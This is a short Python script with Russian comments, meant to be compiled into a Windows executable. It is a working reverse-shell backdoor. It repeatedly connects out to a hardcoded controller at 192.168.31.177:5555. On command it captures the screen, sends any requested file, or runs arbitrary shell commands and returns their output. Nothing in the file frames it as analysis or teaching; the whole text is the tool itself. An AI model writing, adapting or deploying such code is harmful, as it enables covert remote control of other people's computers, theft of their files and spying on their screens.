# simple_client.py (для компиляции в exe)
import socket
import os
import subprocess
import time

SERVER_IP = "192.168.31.177"  # IP твоего Линукса
SERVER_PORT = 5555

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

s = connect()
s.send(b"Windows client connected")

while True:
    try:
        cmd = s.recv(4096).decode().strip()
        if not cmd:
            break
            
        if cmd.upper() == "EXIT":
            break
        elif cmd.upper() == "SCREEN":
            try:
                from PIL import ImageGrab
                import io
                img = ImageGrab.grab()
                img_bytes = io.BytesIO()
                img.save(img_bytes, format='PNG')
                s.send(img_bytes.getvalue())
            except:
                s.send(b"SCREEN ERROR")
        elif cmd.startswith("GET "):
            path = cmd[4:]
            if os.path.exists(path):
                with open(path, "rb") as f:
                    s.send(f.read())
            else:
                s.send(b"FILE NOT FOUND")
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True)
            s.send(result.stdout + result.stderr)
    except:
        s.close()
        s = connect()
